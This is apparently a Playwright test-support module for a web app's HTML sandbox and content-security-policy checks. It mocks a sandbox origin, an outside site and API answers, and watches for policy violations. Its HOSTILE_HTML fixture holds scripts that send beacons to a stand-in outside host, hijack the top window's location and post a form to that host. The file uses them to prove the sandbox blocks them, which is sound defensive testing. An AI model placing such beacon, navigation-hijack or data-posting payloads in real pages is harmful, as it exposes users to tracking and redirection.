/**
 * Ground for the HTML sandbox journey and the page-policy spec (UI M4a, rulings A3 and A5).
 *
 * - The server's page policy (`crates/server/src/assets.rs` `page_headers`): the headers every page
 *   and file of the built UI is served with, added here by a Playwright route to every response of
 *   the spec's static server (`underPagePolicy`). The API's JSON answers are not pages and carry
 *   none of them, as the server sends them.
 * - The sandbox origin (`crates/server/src/sandbox.rs` `isolation_headers`): another origin than
 *   the page's, played by a route that answers each capability the service minted with a hostile
 *   HTML file and exactly the headers `serve_sandbox_representation` sends, and any other path of
 *   that origin with the service's `not_found`, under the same headers (`playSandbox`).
 * - Another site, which the hostile file tries to reach (a script's request, a picture, a link, a
 *   form): every request that reaches it is recorded, and a journey asserts none did.
 *
 * Both header sets are copied from the server's source, value for value; when one changes there,
 * it changes here.
 *
 * Axe beside the sandbox (`expectNoAxeViolationsBesideTheSandbox`): `@axe-core/playwright`
 * evaluates its script in every frame of the page, and in the sandboxed frame, where no script
 * runs (the sandbox working), the run never completed in either engine: the next step, the blank
 * page axe opens to finish its run, was refused (Chromium: `Target.createTarget`) or the page was
 * closed under the test's time limit (WebKit). So the frame is left out of the run; its content is
 * the hostile file's, not the page's, and the frame element's own name (what axe's `frame-title`
 * checks) is checked here instead.
 */

import AxeBuilder from '@axe-core/playwright';
import { expect, type Page, type Route } from '@playwright/test';
import { type Answers, HEAD, ok, summary, WS } from './explorer';
import { png } from './m4a-reader';

/** The configured sandbox origin: another origin than the page's. */
export const SANDBOX_ORIGIN = 'http://sandbox.okf.test:7712';
/** A site the hostile file tries to reach. */
export const ELSEWHERE = 'http://elsewhere.okf.test';

export const HTML_ITEM = '88888888-8888-4888-8888-888888888888';
export const HTML_OBJECT = 'e'.repeat(64);
export const HTML_PATH = 'welcome.html.md';
export const HTML_FILE = 'welcome.html';

/** The HTML source as a listing shows it. */
export const htmlSource = {
  ...summary(HTML_ITEM, HTML_PATH, 'Workshop welcome page', 'page', 'source'),
  extraction: { status: 'completed', text_origin: 'converter', corrected: false },
  media_type: 'text/html',
};

/** Its bytes as `get_item` describes them. */
export const htmlAppearance = {
  extraction: {
    corrected: false,
    outcome: { status: 'completed' },
    text_origin: 'converter',
    warnings: [],
    digest: 'f'.repeat(64),
  },
  media_type: 'text/html',
  metadata: {},
  names: [
    {
      filename: HTML_FILE,
      folder: '',
      observed_at: '2026-10-19T08:00:00.000Z',
      supplied_by: 'upload',
    },
  ],
  object: HTML_OBJECT,
  size: '1824',
};

/**
 * The hostile file. Each of its scripts, if it ran, would rewrite the heading, mark the page and
 * try to reach the other site and the page that frames it; its picture, its link and its form
 * point at the other site too. What it shows without scripts is its heading and its words.
 */
export const HOSTILE_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Workshop welcome</title>
<style>body { font-family: Georgia, serif; margin: 1.5rem; color: #1a1a1a; } h1 { color: #7a2e0e; }</style>
<script>
  document.documentElement.dataset.scriptRan = 'head';
  try { fetch('${ELSEWHERE}/beacon?from=head-script'); } catch (error) {}
  try { parent.postMessage('script ran', '*'); } catch (error) {}
</script>
</head>
<body>
<h1 id="welcome">Welcome to the workshop</h1>
<p id="words">Please read the programme before Monday.</p>
<p><img src="${ELSEWHERE}/pixel.png" alt="A pixel from another site"></p>
<img src="data:," alt="" onerror="document.getElementById('welcome').textContent = 'SCRIPT RAN'">
<p><a id="away" href="${ELSEWHERE}/away">Read the programme on another site</a></p>
<p><a id="popup" href="${ELSEWHERE}/popup" target="_blank">Open the programme in a new window</a></p>
<p><a id="top" href="${ELSEWHERE}/top" target="_top">Open the programme in place of this page</a></p>
<form id="survey" action="${ELSEWHERE}/collect" method="post">
<label>Your name <input name="who" value="Ada"></label>
<button id="send" type="submit">Send</button>
</form>
<script>
  document.getElementById('welcome').textContent = 'SCRIPT RAN';
  document.body.dataset.scriptRan = 'body';
  try { new Image().src = '${ELSEWHERE}/beacon?from=body-script'; } catch (error) {}
  try { top.location = '${ELSEWHERE}/hijack'; } catch (error) {}
</script>
</body>
</html>
`;

/**
 * The isolation headers of every sandbox-origin response (`sandbox.rs` `isolation_headers`), for
 * a page served from `appOrigin`.
 */
export function isolationHeaders(appOrigin: string): Record<string, string> {
  return {
    'content-security-policy': `sandbox; default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; media-src data:; form-action 'none'; base-uri 'none'; frame-ancestors ${appOrigin}`,
    'cache-control': 'no-store',
    'referrer-policy': 'no-referrer',
    'x-content-type-options': 'nosniff',
    'permissions-policy':
      'camera=(), microphone=(), geolocation=(), payment=(), usb=(), clipboard-read=(), clipboard-write=()',
    'cross-origin-resource-policy': 'same-site',
  };
}

/** The page policy (`assets.rs` `page_headers`), its frames allowed only from `sandboxOrigin`. */
export function pagePolicy(sandboxOrigin: string): Record<string, string> {
  return {
    'content-security-policy': `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; worker-src 'self'; frame-src ${sandboxOrigin}; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'`,
    'x-content-type-options': 'nosniff',
    'referrer-policy': 'no-referrer',
    'x-frame-options': 'DENY',
    'cross-origin-opener-policy': 'same-origin',
  };
}

/**
 * Serve every response of the built UI at `appOrigin` with the page policy, as the server does
 * (`assets.rs`): the static server's answer, with the policy's headers added. The API (`/api/`)
 * is left to the routes that answer it, registered after this one.
 */
export async function underPagePolicy(page: Page, appOrigin: string) {
  const headers = pagePolicy(SANDBOX_ORIGIN);
  await page.route(`${appOrigin}/**`, async (route: Route) => {
    const path = new URL(route.request().url()).pathname;
    if (path === '/api' || path.startsWith('/api/')) {
      await route.fallback();
      return;
    }
    const response = await route.fetch();
    await route.fulfill({ response, headers: { ...response.headers(), ...headers } });
  });
}

/** What the sandbox origin and the other site saw. */
export interface SandboxService {
  /** Each capability the service minted, in order. */
  minted: Array<{ url: string; expires_at: string }>;
  /** Each `create_sandbox_capability` request, in order. */
  asked: Array<Record<string, unknown>>;
  /** Every request to the sandbox origin, as its path, with the `Referer` it carried. */
  served: Array<{ path: string; referer: string | null; cookie: string | null }>;
  /** Every request that reached the other site. */
  elsewhere: string[];
}

/** One token per capability, numbered in the order minted. */
function tokenOf(number: number): string {
  return `t${number}`.padEnd(64, '0');
}

/**
 * Play the sandbox for a page served from `appOrigin`: `create_sandbox_capability` mints a new
 * capability living `lifetimeMs` each time it is asked (`answers`, for `routeApi`); the sandbox
 * origin serves the hostile file for each capability minted and `not_found` for anything else,
 * with `isolation` as its headers (the service's own unless a journey says otherwise); the other
 * site answers and records each request.
 */
export async function playSandbox(
  page: Page,
  appOrigin: string,
  options: { lifetimeMs?: number; isolation?: Record<string, string> } = {},
): Promise<{ service: SandboxService; answers: Answers }> {
  const lifetimeMs = options.lifetimeMs ?? 300_000;
  const isolation = options.isolation ?? isolationHeaders(appOrigin);
  const service: SandboxService = { minted: [], asked: [], served: [], elsewhere: [] };
  await page.route(`${SANDBOX_ORIGIN}/**`, async (route: Route) => {
    const request = route.request();
    const path = new URL(request.url()).pathname;
    const headers = await request.allHeaders();
    service.served.push({
      path,
      referer: headers.referer ?? null,
      cookie: headers.cookie ?? null,
    });
    const known = service.minted.some((capability) => new URL(capability.url).pathname === path);
    if (known) {
      await route.fulfill({
        status: 200,
        headers: { ...isolation, 'content-type': 'text/html' },
        body: HOSTILE_HTML,
      });
      return;
    }
    await route.fulfill({
      status: 404,
      headers: { ...isolation, 'content-type': 'application/json' },
      body: JSON.stringify({ code: 'not_found', message: 'No such sandboxed representation' }),
    });
  });
  await page.route(`${ELSEWHERE}/**`, async (route: Route) => {
    service.elsewhere.push(route.request().url());
    await route.fulfill({ status: 200, contentType: 'text/plain', body: 'reached' });
  });
  const answers: Answers = {
    '/api/reads/create-sandbox-capability': (body) => {
      service.asked.push(body);
      const capability = {
        url: `${SANDBOX_ORIGIN}/sandbox/${tokenOf(service.minted.length + 1)}`,
        expires_at: new Date(Date.now() + lifetimeMs).toISOString(),
      };
      service.minted.push(capability);
      return ok(capability);
    },
  };
  return { service, answers };
}

/** The Explorer's answers with the HTML source at the root of the workspace. */
export function htmlSourceAnswers(): Answers {
  return {
    '/api/items/list-items': (body) =>
      body.folder === 'notes'
        ? ok({ folders: [], items: [], revision: HEAD })
        : ok({ folders: ['notes'], items: [htmlSource], revision: HEAD }),
    '/api/items/get-item': () =>
      ok({
        summary: htmlSource,
        body: '# Workshop welcome page\n\nWelcome to the workshop.',
        content_digest: 'c'.repeat(64),
        properties: { type: 'page', okf_jawn: { id: HTML_ITEM } },
        source: htmlAppearance,
      }),
    // Nothing cites another item, and Attention found nothing here.
    '/api/reads/get-sources': () => ok({ revision: HEAD, sources: [], declared: [] }),
    '/api/attention/get-attention': () => ok({ revision: HEAD, items: [], next_cursor: null }),
    '/api/reads/read-item': (body) =>
      ok({
        // No level-one heading in the text: one puts an h1 before the reader's h3 "Original", and
        // axe reports heading-order there (`DocumentView.tsx`, the reader's; requested in M4a).
        markdown: 'Welcome to the workshop.\n\nPlease read the programme before Monday.',
        media: [],
        outline: [],
        receipt_id: '55555555-5555-4555-8555-555555555555',
        source: {
          workspace_id: WS,
          item_id: HTML_ITEM,
          path: HTML_PATH,
          revision: HEAD,
          selection: body.selection,
          locations: [],
        },
        truncated: false,
        view: 'text',
        warnings: [],
        extraction: { status: 'completed', text_origin: 'converter', corrected: false },
      }),
  };
}

/**
 * Zero axe violations on the page, the sandboxed frame left out of the run (see the module
 * header); every sandboxed frame has a name of its own.
 */
export async function expectNoAxeViolationsBesideTheSandbox(page: Page, screen: string) {
  const result = await new AxeBuilder({ page }).exclude('iframe[sandbox]').analyze();
  const found = result.violations.map((violation) => ({
    id: violation.id,
    impact: violation.impact,
    nodes: violation.nodes.map((node) => node.target.join(' ')),
  }));
  expect(found, `${screen}: ${JSON.stringify(found, null, 2)}`).toEqual([]);
  const titles = await page
    .locator('iframe[sandbox]')
    .evaluateAll((frames) => frames.map((frame) => frame.getAttribute('title') ?? ''));
  for (const title of titles)
    expect(title.trim(), `${screen}: a sandboxed frame’s name`).not.toBe('');
}

// ---------------------------------------------------------------------------------------------
// The page policy spec (A5): an original of every kind the reader shows, and what the page does
// under the policy.
// ---------------------------------------------------------------------------------------------

/** A one-page PDF with one line of text in a standard font, its cross-reference table exact. */
export function onePagePdf(): Buffer {
  const objects = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 144] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>',
    '',
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ];
  const text = 'BT /F1 18 Tf 24 72 Td (Annual report 2025) Tj ET';
  objects[3] = `<< /Length ${text.length} >>\nstream\n${text}\nendstream`;
  let body = '%PDF-1.4\n';
  const offsets: number[] = [];
  objects.forEach((object, index) => {
    offsets.push(Buffer.byteLength(body));
    body += `${index + 1} 0 obj\n${object}\nendobj\n`;
  });
  const xref = Buffer.byteLength(body);
  body += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  for (const offset of offsets) body += `${String(offset).padStart(10, '0')} 00000 n \n`;
  body += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(body, 'latin1');
}

/** Real PNG bytes from the reader journey's existing encoder, with valid chunks and checksums. */
export const ONE_PIXEL_PNG = png(1, 1, 0);

export const PLAIN_ITEM = 'a1a1a1a1-0000-4000-8000-000000000008';
export const PLAIN_PATH = 'agenda.txt.md';
export const PLAIN_ORIGINAL = 'Agenda\nBudget: 1.2 M\nDone.\n';
export const PLAIN_DIGEST = '# Agenda\n\nBudget: 1.2 M\n\nDone.\n';

/** One original the reader shows, of one kind (`original-kind.ts`). */
export interface Original {
  kind: 'pdf' | 'image' | 'html' | 'spreadsheet' | 'office' | 'text' | 'other';
  id: string;
  path: string;
  title: string;
  filename: string;
  mediaType: string;
  object: string;
  bytes: Buffer;
  /** The type `download_object` sends it as (`transfers.rs` `INERT_TYPES`, else octet-stream). */
  sentAs: string;
  text: string;
}

const PAGE_RENDER = '9'.repeat(64);

/** An original of each kind; the HTML one is the hostile file, framed from the sandbox origin. */
export const ORIGINALS: Original[] = [
  {
    kind: 'pdf',
    id: 'a1a1a1a1-0000-4000-8000-000000000001',
    path: 'annual-report.pdf.md',
    title: 'Annual report 2025',
    filename: 'annual-report.pdf',
    mediaType: 'application/pdf',
    object: '1'.repeat(64),
    bytes: onePagePdf(),
    sentAs: 'application/pdf',
    text: 'Annual report 2025.',
  },
  {
    kind: 'image',
    id: 'a1a1a1a1-0000-4000-8000-000000000002',
    path: 'whiteboard.png.md',
    title: 'Whiteboard photo',
    filename: 'whiteboard.png',
    mediaType: 'image/png',
    object: '2'.repeat(64),
    bytes: png(320, 180, 1),
    sentAs: 'image/png',
    text: 'A photo of the whiteboard.',
  },
  {
    kind: 'html',
    id: HTML_ITEM,
    path: HTML_PATH,
    title: 'Workshop welcome page',
    filename: HTML_FILE,
    mediaType: 'text/html',
    object: HTML_OBJECT,
    bytes: Buffer.from(HOSTILE_HTML),
    sentAs: 'application/octet-stream',
    text: 'Welcome to the workshop.',
  },
  {
    kind: 'spreadsheet',
    id: 'a1a1a1a1-0000-4000-8000-000000000004',
    path: 'revenue.csv.md',
    title: 'Revenue by quarter',
    filename: 'revenue.csv',
    mediaType: 'text/csv',
    object: '4'.repeat(64),
    bytes: Buffer.from('quarter,revenue\nQ1,1.2\nQ2,1.4\nQ3,1.9\nQ4,2.3\n'),
    sentAs: 'application/octet-stream',
    text: '| quarter | revenue |\n| --- | --- |\n| Q1 | 1.2 |\n| Q2 | 1.4 |\n| Q3 | 1.9 |\n| Q4 | 2.3 |',
  },
  {
    kind: 'office',
    id: 'a1a1a1a1-0000-4000-8000-000000000005',
    path: 'minutes.rtf.md',
    title: 'Minutes',
    filename: 'minutes.rtf',
    mediaType: 'application/rtf',
    object: '5'.repeat(64),
    bytes: Buffer.from('{\\rtf1\\ansi Minutes of the October workshop.}'),
    sentAs: 'application/octet-stream',
    text: 'Minutes of the October workshop.',
  },
  {
    kind: 'text',
    id: 'a1a1a1a1-0000-4000-8000-000000000006',
    path: 'tally.py.md',
    title: 'Tally script',
    filename: 'tally.py',
    mediaType: 'text/x-python',
    object: '6'.repeat(64),
    bytes: Buffer.from('def tally(rows):\n    return sum(row["revenue"] for row in rows)\n'),
    sentAs: 'application/octet-stream',
    text: '```python\ndef tally(rows):\n    return sum(row["revenue"] for row in rows)\n```',
  },
  {
    kind: 'other',
    id: 'a1a1a1a1-0000-4000-8000-000000000007',
    path: 'photos.zip.md',
    title: 'Photos',
    filename: 'photos.zip',
    mediaType: 'application/zip',
    object: '7'.repeat(64),
    // A complete empty ZIP end-of-central-directory record, not a truncated magic prefix.
    bytes: Buffer.from([0x50, 0x4b, 0x05, 0x06, ...Array<number>(18).fill(0)]),
    sentAs: 'application/octet-stream',
    text: '',
  },
  {
    kind: 'text',
    id: PLAIN_ITEM,
    path: PLAIN_PATH,
    title: 'Agenda',
    filename: 'agenda.txt',
    mediaType: 'text/plain',
    object: '8'.repeat(64),
    bytes: Buffer.from(PLAIN_ORIGINAL),
    sentAs: 'application/octet-stream',
    text: PLAIN_DIGEST,
  },
  {
    kind: 'text',
    id: 'a1a1a1a1-0000-4000-8000-000000000009',
    path: 'revenue.json.md',
    title: 'Revenue data',
    filename: 'revenue.json',
    mediaType: 'application/json',
    object: 'a'.repeat(64),
    bytes: Buffer.from('{"revenue":[1.2,1.4,1.9,2.3]}\n'),
    sentAs: 'application/octet-stream',
    text: 'Revenue data: 1.2, 1.4, 1.9, 2.3.\n',
  },
];

function originalSummary(original: Original) {
  return {
    ...summary(original.id, original.path, original.title, 'source-file', 'source'),
    extraction: {
      status: original.kind === 'other' ? 'unsupported' : 'completed',
      text_origin: original.kind === 'other' ? 'none' : 'converter',
      corrected: false,
    },
    media_type: original.mediaType,
  };
}

function originalAppearance(original: Original) {
  const converted = original.kind !== 'other';
  return {
    extraction: {
      corrected: false,
      outcome: converted ? { status: 'completed' } : { status: 'unsupported' },
      text_origin: converted ? 'converter' : 'none',
      warnings: [],
      ...(converted ? { digest: 'f'.repeat(64) } : {}),
      ...(original.kind === 'pdf' ? { page_count: 1 } : {}),
    },
    media_type: original.mediaType,
    metadata: {},
    names: [
      {
        filename: original.filename,
        folder: '',
        observed_at: '2026-10-19T08:00:00.000Z',
        supplied_by: 'upload',
      },
    ],
    object: original.object,
    size: String(original.bytes.length),
  };
}

/** The Explorer's answers with every original at the root of the workspace. */
export function originalsAnswers(): Answers {
  const byId = new Map(ORIGINALS.map((original) => [original.id, original]));
  return {
    '/api/items/list-items': (body) =>
      body.folder === 'notes'
        ? ok({ folders: [], items: [], revision: HEAD })
        : ok({ folders: ['notes'], items: ORIGINALS.map(originalSummary), revision: HEAD }),
    '/api/items/get-item': (body) => {
      const original = byId.get(String(body.item_id)) ?? ORIGINALS[0];
      if (original === undefined) return { status: 404, body: { code: 'not_found', message: '' } };
      return ok({
        summary: originalSummary(original),
        body: original.text,
        content_digest: 'c'.repeat(64),
        properties: { type: 'source-file', okf_jawn: { id: original.id } },
        source: originalAppearance(original),
      });
    },
    '/api/reads/get-sources': () => ok({ revision: HEAD, sources: [], declared: [] }),
    '/api/attention/get-attention': () => ok({ revision: HEAD, items: [], next_cursor: null }),
    '/api/reads/read-item': (body) => {
      const original = byId.get(String(body.item_id)) ?? ORIGINALS[0];
      if (original === undefined) return { status: 404, body: { code: 'not_found', message: '' } };
      const source = {
        workspace_id: WS,
        item_id: original.id,
        path: original.path,
        revision: HEAD,
        digest: 'f'.repeat(64),
        selection: body.selection,
        locations: [],
      };
      const pages =
        original.kind === 'pdf' && (body.view === 'pages' || body.view === 'multimodal');
      return ok({
        markdown: original.text,
        media: pages
          ? [
              {
                media_type: 'image/png',
                object: PAGE_RENDER,
                role: 'page_image',
                width: 1,
                height: 1,
                source: {
                  ...source,
                  selection: { kind: 'pages', range: { start: 1, end: 1 } },
                  locations: [{ provenance: 'direct', locator: { kind: 'page', page_no: 1 } }],
                },
              },
            ]
          : [],
        outline: [],
        receipt_id: '55555555-5555-4555-8555-555555555555',
        source,
        truncated: false,
        view: body.view ?? 'text',
        warnings: [],
        extraction: {
          status: original.kind === 'other' ? 'unsupported' : 'completed',
          text_origin: original.kind === 'other' ? 'none' : 'converter',
          corrected: false,
        },
      });
    },
  };
}

/**
 * Answer `download_object` for every original and the PDF's page render, as `transfers.rs` sends
 * a download: an attachment, `sandbox; default-src 'none'`, `nosniff`, the declared type unless
 * the stored one is inert, a single range when asked (206 with `Content-Range`). Registered after
 * `routeApi`, so it answers before that route's `/api/**`.
 */
export async function routeObjects(page: Page) {
  const bytes = new Map<string, { body: Buffer; type: string }>(
    ORIGINALS.map((original) => [original.object, { body: original.bytes, type: original.sentAs }]),
  );
  bytes.set(PAGE_RENDER, { body: ONE_PIXEL_PNG, type: 'image/png' });
  await page.route('**/api/workspaces/*/items/*/revisions/*/objects/*', async (route: Route) => {
    const digest = new URL(route.request().url()).pathname.split('/').pop() ?? '';
    const found = bytes.get(digest);
    if (route.request().method() !== 'GET' || found === undefined) {
      await route.fulfill({
        status: 404,
        contentType: 'application/json',
        body: JSON.stringify({ code: 'not_found', message: 'No such object' }),
      });
      return;
    }
    const headers: Record<string, string> = {
      'content-type': found.type,
      'accept-ranges': 'bytes',
      'content-disposition': 'attachment',
      'content-security-policy': "sandbox; default-src 'none'",
      'x-content-type-options': 'nosniff',
    };
    const range = /^bytes=(\d+)-(\d*)$/.exec((await route.request().allHeaders()).range ?? '');
    if (range !== null) {
      const start = Number(range[1]);
      const end = Math.min(
        range[2] === undefined || range[2] === '' ? found.body.length - 1 : Number(range[2]),
        found.body.length - 1,
      );
      const part = found.body.subarray(start, end + 1);
      await route.fulfill({
        status: 206,
        headers: {
          ...headers,
          'content-length': String(part.length),
          'content-range': `bytes ${start}-${end}/${found.body.length}`,
        },
        body: part,
      });
      return;
    }
    await route.fulfill({
      status: 200,
      headers: { ...headers, 'content-length': String(found.body.length) },
      body: found.body,
    });
  });
}

/** One Content-Security-Policy violation the page reported (`securitypolicyviolation`). */
export interface Violation {
  directive: string;
  blocked: string;
  source: string;
  sample: string;
  document: string;
}

/** A `<style>` element put in the page by script, with what it starts with and who made it. */
export interface InsertedStyle {
  text: string;
  attributes: string;
  stack: string;
}

/** Everything the page did under the policy that the spec reports. */
export interface PolicyFindings {
  violations: Violation[];
  styles: InsertedStyle[];
  /** Each `blob:` or `data:` address the page made or used, with where it was seen. */
  urls: Array<{ url: string; where: string }>;
  /** Each worker the page started, by its address. */
  workers: string[];
}

/**
 * Watch the page from before its first script, in its top document only (the sandboxed frame has
 * its own policy and its own refusals): every `securitypolicyviolation`, every `<style>` element
 * added (with the stack that made it, where `createElement` made it), every object URL made, and
 * every worker started. `policyFindings` reads them, with the `blob:` and `data:` addresses then in
 * the page's attributes, computed styles and stylesheets.
 */
export async function watchPolicy(page: Page) {
  await page.addInitScript(() => {
    if (window !== window.top) return;
    const found = {
      violations: [] as Array<Record<string, string>>,
      styles: [] as Array<Record<string, string>>,
      urls: [] as Array<{ url: string; where: string }>,
      workers: [] as string[],
    };
    Object.defineProperty(window, '__okfPolicy', { value: found });
    document.addEventListener(
      'securitypolicyviolation',
      (event) => {
        found.violations.push({
          directive: event.effectiveDirective || event.violatedDirective,
          blocked: event.blockedURI,
          source: `${event.sourceFile}:${event.lineNumber}:${event.columnNumber}`,
          sample: event.sample,
          document: event.documentURI,
        });
      },
      true,
    );
    const made = new WeakMap<Node, string>();
    const createElement = Document.prototype.createElement;
    Document.prototype.createElement = function (
      this: Document,
      name: string,
      options?: ElementCreationOptions,
    ) {
      const element = createElement.call(this, name, options);
      if (name.toLowerCase() === 'style') made.set(element, new Error('style made').stack ?? '');
      return element;
    } as typeof Document.prototype.createElement;
    const seenStyles = new WeakSet<Node>();
    const seenUrls = new Set<string>();
    const recordStyle = (node: Node) => {
      if (!(node instanceof HTMLStyleElement)) return;
      if (seenStyles.has(node)) return;
      seenStyles.add(node);
      found.styles.push({
        text: (node.textContent ?? '').replace(/\s+/g, ' ').slice(0, 200),
        attributes: [...node.attributes].map((a) => `${a.name}=${a.value}`).join(' '),
        stack: (made.get(node) ?? '').split('\n').slice(1, 6).join(' | '),
      });
    };
    const record = (node: Node) => {
      if (!(node instanceof Element)) return;
      for (const element of [node, ...node.querySelectorAll('*')]) {
        recordStyle(element);
        for (const attribute of element.attributes) {
          const url = attribute.value.trim();
          const where = `<${element.localName}> ${attribute.name}`;
          const key = `${where}\n${url}`;
          if (/^(blob:|data:)/i.test(url) && !seenUrls.has(key)) {
            seenUrls.add(key);
            found.urls.push({ url: url.slice(0, 60), where });
          }
        }
      }
    };
    new MutationObserver((records) => {
      for (const entry of records) {
        if (entry.type === 'attributes') record(entry.target);
        for (const node of entry.addedNodes) record(node);
        for (const node of entry.removedNodes) record(node);
      }
    }).observe(document, { childList: true, subtree: true, attributes: true });
    const createObjectURL = URL.createObjectURL;
    URL.createObjectURL = (object: Blob | MediaSource) => {
      const url = createObjectURL(object);
      const type = object instanceof Blob ? object.type || 'no type' : 'a media source';
      found.urls.push({ url: 'blob:', where: `URL.createObjectURL (${type})` });
      return url;
    };
    const NativeWorker = window.Worker;
    window.Worker = class extends NativeWorker {
      constructor(url: string | URL, options?: WorkerOptions) {
        found.workers.push(String(url));
        super(url, options);
      }
    };
  });
}

/** What the page did under the policy so far, with the `blob:` and `data:` addresses it holds. */
export async function policyFindings(page: Page): Promise<PolicyFindings> {
  return page.evaluate(() => {
    const raw: unknown = Reflect.get(window, '__okfPolicy');
    const empty = { violations: [], styles: [], urls: [], workers: [] };
    const found = (typeof raw === 'object' && raw !== null ? raw : empty) as {
      violations: Violation[];
      styles: InsertedStyle[];
      urls: Array<{ url: string; where: string }>;
      workers: string[];
    };
    const urls = [...found.urls];
    const scheme = /^(blob:|data:)/i;
    const inCss = /url\(\s*["']?(blob:|data:)([^"')]{0,60})/gi;
    for (const element of document.querySelectorAll('*')) {
      for (const attribute of element.attributes) {
        if (scheme.test(attribute.value.trim())) {
          urls.push({
            url: attribute.value.trim().slice(0, 60),
            where: `<${element.localName}> ${attribute.name}`,
          });
        }
      }
      const style = getComputedStyle(element);
      for (const property of ['background-image', 'mask-image', 'list-style-image', 'content']) {
        for (const match of style.getPropertyValue(property).matchAll(inCss)) {
          urls.push({ url: `${match[1]}${match[2]}`, where: `<${element.localName}> ${property}` });
        }
      }
    }
    for (const sheet of document.styleSheets) {
      let rules: CSSRuleList;
      try {
        rules = sheet.cssRules;
      } catch {
        continue;
      }
      for (const rule of rules) {
        for (const match of rule.cssText.matchAll(inCss)) {
          urls.push({
            url: `${match[1]}${match[2]}`,
            where: `stylesheet ${sheet.href ?? '<style>'}: ${rule.cssText.slice(0, 60)}`,
          });
        }
      }
    }
    return { ...found, urls };
  });
}
